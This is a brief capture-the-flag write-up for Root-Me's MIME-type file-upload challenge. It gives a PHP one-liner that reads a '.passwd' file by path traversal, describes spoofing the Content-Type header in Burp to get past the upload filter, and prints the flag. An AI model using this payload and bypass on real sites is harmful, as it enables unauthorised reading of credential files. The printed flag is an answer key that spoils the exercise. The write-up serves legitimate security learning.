# [File Upload: MIME Type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)

Another photo gallery (although a bit darker this time). We test the photo upload functionality 
and see it's uploaded.

Let's try to upload a PHP file: `evil.php`

`<?php echo readfile("../../../.passwd"); ?>`

> Wrong file type!

Ok let's just intercept the request with Burp and change the `Content-Type` to `image/jpeg`

Ok our file got through!

If we go to the file, we see our password.

Password is: **a7n4nizpgQgnPERy89uanf6T4**
